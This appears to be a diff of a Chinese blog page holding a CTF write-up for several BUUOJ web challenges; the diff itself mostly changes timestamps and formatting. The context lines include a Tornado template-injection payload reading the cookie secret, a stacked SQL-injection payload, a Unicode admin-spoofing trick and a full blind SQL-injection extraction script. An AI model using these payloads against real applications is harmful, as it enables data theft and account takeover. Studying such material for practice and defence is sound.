@@ -58,7 +58,7 @@
 <meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1582190298655-c0aaeb77-f67c-48c6-a2b5-23213c49c7c1.png#align=left&display=inline&height=156&margin=%5Bobject%20Object%5D&originHeight=156&originWidth=473&size=0&status=done&style=shadow&width=473">
 <meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1582190298685-a18c89f4-bf7f-46b2-b446-77fd58b5b465.png#align=left&display=inline&height=266&margin=%5Bobject%20Object%5D&originHeight=408&originWidth=1105&size=0&status=done&style=none&width=720">
 <meta property="article:published_time" content="2020-02-20T09:18:10.000Z">
-<meta property="article:modified_time" content="2020-08-18T00:44:33.262Z">
+<meta property="article:modified_time" content="2020-08-25T06:32:36.682Z">
 <meta property="article:author" content="yichen">
 <meta property="article:tag" content="网络安全 CTF">
 <meta name="twitter:card" content="summary">
@@ -302,6 +302,8 @@
                 <div class="image-caption"></div>
             </figure>
 
+
+
 <h1 id="easy-tornado"><a href="#easy-tornado" class="headerlink" title="easy_tornado"></a>easy_tornado</h1><p>打开看到有三个文件：</p>
 <figure class="image-bubble">
                 <div class="img-lightbox">
@@ -371,7 +373,7 @@
             </figure>
 
 <p>在 tornado 模板中，存在一些可以访问的快速对象，例如：</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span></span><br><span class="line">  &#123;&#123; escape(handler.settings["cookie"]) &#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>&#123;&#123; escape(handler.settings["cookie"]) &#125;&#125;<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>那么输入：<code>****</code><br>**</p>
 <figure class="image-bubble">
@@ -392,6 +394,8 @@
                 </div>
                 <div class="image-caption"></div>
             </figure>
+
+
 
 <h1 id="EasySQL"><a href="#EasySQL" class="headerlink" title="EasySQL"></a>EasySQL</h1><p>这道题目有两种解法，一种是：<strong>*,1</strong>，这样查询结果会把表中所有的数据返回来（据说是非预期解，出题人可能忘记过滤掉*了）<br>还有一种说是考察 sql_mode，通过堆叠注入修改 sql_mode，<br>可以通过修改 sql_mode 模式 : PIPES_AS_CONCAT  来实现将 <code>||</code> 视为字符串连接符而非   或   运算符<br>因此这里预期的 Payload 是通过修改 sql_mode 来拿到 Flag</p>
 <p>Payload :<br>1;set sql_mode=PIPES_AS_CONCAT;SELECT 1<br>拼接后就变成了<br>SELECT 1;set sql_mode=PIPES_AS_CONCAT;SELECT 1 || flag FROM Flag</p>
@@ -433,6 +437,8 @@
                 </div>
                 <div class="image-caption"></div>
             </figure>
+
+
 
 <h1 id="admin"><a href="#admin" class="headerlink" title="admin"></a>admin</h1><p>网上的  wp  有三个方法，这里只记录一个，Unicode 欺骗<br><a href="https://www.anquanke.com/post/id/164086" target="_blank" rel="noopener">https://www.anquanke.com/post/id/164086</a></p>
 <p>注册用户：ᴬdmin<br>会将其变成：Admin<br>修改密码的时候会变成：admin<br>这样就可以直接访问 admin 用户</p>
@@ -491,6 +497,8 @@
 <h1 id="Hack-World"><a href="#Hack-World" class="headerlink" title="Hack World"></a>Hack World</h1><p>sql 注入题目，通过基于时间的盲注可以测出来，但是不会写脚本，懒得一个一个测，看了师傅们的 wp<br>  师傅们用了 异或   这种操作，长见识了，师傅们的 WP：<br>（意识到应该整理一些  sqli  的 FUZZ  字典</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">a</span><span class="params">()</span>:</span></span><br><span class="line">    url=<span class="string">"http://af100f25-ad84-449a-98cc-64ef4e7fda40.node3.buuoj.cn"</span></span><br><span class="line">    flag=<span class="string">"Hello, glzjin wants a girlfriend."</span></span><br><span class="line">    final=<span class="string">""</span></span><br><span class="line">    stop=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">1290</span>):</span><br><span class="line">         print(<span class="string">"*"</span>*<span class="number">50</span>,i,<span class="string">"*"</span>*<span class="number">50</span>)</span><br><span class="line">         stop=<span class="number">0</span></span><br><span class="line">         <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">129</span>):</span><br><span class="line">             stop = j</span><br><span class="line">             data=&#123;<span class="string">"id"</span>:<span class="string">"1^(if((ascii(substr((select(flag)from(flag)),%d,1))=%d),0,1))"</span> %(i,j)&#125;</span><br><span class="line">             re = requests.post(url=url,data=data).text.replace(<span class="string">'\n'</span>,<span class="string">''</span>)</span><br><span class="line">             html = etree.HTML(re).xpath(<span class="string">"//text()"</span>)</span><br><span class="line">             <span class="comment"># print("&gt;&gt;",html)</span></span><br><span class="line">             <span class="keyword">if</span> flag <span class="keyword">in</span> html:</span><br><span class="line">                  final+=chr(j)</span><br><span class="line">                  print(<span class="string">"\n\t\t\t\t"</span>,final)</span><br><span class="line">                  <span class="keyword">break</span></span><br><span class="line">         <span class="keyword">if</span> stop &gt;= <span class="number">128</span>:</span><br><span class="line">            print(<span class="string">"*"</span>*<span class="number">50</span>,<span class="string">"结束"</span>)</span><br><span class="line">            print(<span class="string">"&gt;&gt;"</span>,final)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">       a()</span><br></pre></td></tr></table></figure>
 
+
+
 <h1 id="Easy-Cacl"><a href="#Easy-Cacl" class="headerlink" title="Easy Cacl"></a>Easy Cacl</h1><p>** PHP  字符串解析特性**：<br>  当 php  查询字符串进行解析的时候会将某些字符删除或用下划线代替<br>参考：<a href="https://www.freebuf.com/articles/web/213359.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/213359.html</a></p>
 <figure class="image-bubble">
                 <div class="img-lightbox">
@@ -509,7 +517,7 @@
     <div class="content">
         
 <span class="post-time">
-    最后更新时间：<time datetime="2020-08-18T00:44:33.262Z" itemprop="dateUpdated">2020-08-18 08:44:33</time>
+    最后更新时间：<time datetime="2020-08-25T06:32:36.682Z" itemprop="dateUpdated">2020-08-25 14:32:36</time>
 </span><br>
 
 
